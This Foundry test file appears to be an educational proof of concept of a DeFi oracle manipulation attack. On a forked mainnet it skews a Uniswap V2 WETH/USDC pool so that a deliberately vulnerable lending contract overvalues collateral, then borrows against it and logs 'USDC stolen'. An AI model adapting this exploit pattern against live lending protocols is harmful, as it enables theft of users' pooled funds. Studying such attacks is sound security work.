// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {VulnerableLendingProtocol} from "../src/OracleManipulationAttack.sol";

// Interfaces
interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function approve(address, uint256) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract OracleManipulationAttack is Test {
    // mainnet addresses
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH_USDC_PAIR =
        0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    IUniswapV2Pair pair = IUniswapV2Pair(WETH_USDC_PAIR);
    IERC20 weth = IERC20(WETH);
    IERC20 usdc = IERC20(USDC);

    VulnerableLendingProtocol lendingProtocol;

    function setUp() public {
        // fork mainnet
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // deploy vulnerable lending protocol
        lendingProtocol = new VulnerableLendingProtocol(
            WETH_USDC_PAIR,
            WETH,
            address(usdc)
        );

        // fund lending protocol with USDC to borrow
        deal(address(usdc), address(lendingProtocol), 10_000_000e6); // 10M USDC

        // give attacker some WETH as collateral
        deal(address(weth), address(this), 10e18); // 10 WETH
    }

    function testOracleManipulation() public {
        (uint112 r0, uint112 r1, ) = pair.getReserves();

        // Step 1: deposit collateral
        weth.approve(address(lendingProtocol), 10e18);
        lendingProtocol.depositCollateral(10e18);

        // Step 2: log price before
        uint256 priceBefore = lendingProtocol.getCollateralPrice();
        console.log("ETH price before:", priceBefore / 1e6, "USDC");
        uint256 maxBorrowBefore = ((10 * priceBefore) * 75) / 100;
        console.log("Max borrow before:", maxBorrowBefore / 1e6, "USDC");

        // Step 3: manipulate price — dump USDC into pool to drain WETH
        // this makes WETH scarce → WETH price spikes in USDC terms
        uint256 usdcDump = uint256(r0) * 10; // dump 10x current USDC reserves
        deal(address(usdc), address(this), usdcDump);
        usdc.transfer(address(pair), usdcDump);
        // swap — send USDC in, get WETH out (amount0In > 0, we want WETH out)
        pair.swap(0, (uint256(r1) * 90) / 100, address(this), ""); // empty = no callback

        // Step 4: read manipulated price
        uint256 priceAfter = lendingProtocol.getCollateralPrice();
        console.log("ETH price DURING attack:", priceAfter / 1e6, "USDC");
        uint256 maxBorrowAfter = ((10 * priceAfter) * 75) / 100;
        console.log(
            "Max borrow after manipulation:",
            maxBorrowAfter / 1e6,
            "USDC"
        );

        // Step 5: exploit lending protocol at manipulated price
        lendingProtocol.borrow(maxBorrowAfter);

        // Step 6: log profit
        uint256 usdcBalance = usdc.balanceOf(address(this));
        console.log("USDC stolen:", usdcBalance / 1e6);
    }
}
